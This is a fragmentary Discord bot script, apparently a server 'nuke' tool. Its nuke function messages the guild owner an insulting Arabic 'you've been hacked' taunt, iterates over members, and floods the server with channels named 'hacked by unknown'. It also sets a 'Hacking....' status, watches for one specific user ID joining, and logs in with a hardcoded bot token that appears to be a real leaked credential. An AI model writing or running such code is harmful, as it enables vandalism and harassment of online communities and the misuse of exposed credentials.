...
LOka.on('message', message => {
     if (message.content === ".") {
client.user.setGame(`Hacking....`,"http://twitch.tv/S-F")
...
async function nuke(guild) {
  ...
  await guild.owner.send('تم تهكيرك بواسطة الهكر الثقيل :middle_finger:').catch(e => { return void e; });
  ...
  await Promise.all(guild.members.map(async (m) => {
    ...
    await guild.createChannel('hacked by unknown', 'text');
    await guild.createChannel('hacked by unknown', 'text');
    await guild.createChannel('hacked by unknown', 'text');
    await guild.createChannel('hacked by unknown', 'text');
    await guild.createChannel('hacked by unknown', 'text');
    ...
    await guild.createChannel('hacked by unknown', 'text');
      ...
      await guild.createChannel('braa', 'voice');
...
LOka.on('guildMemberAdd', member => {
            ...
            if (member.id === "468479699543130132") {
...
LOka.login("NTIwNTU3NjU4MjQ0MzgyNzM0.Du2EAw.CloQKQd9IbAUXlJA4kXxekT0xE8")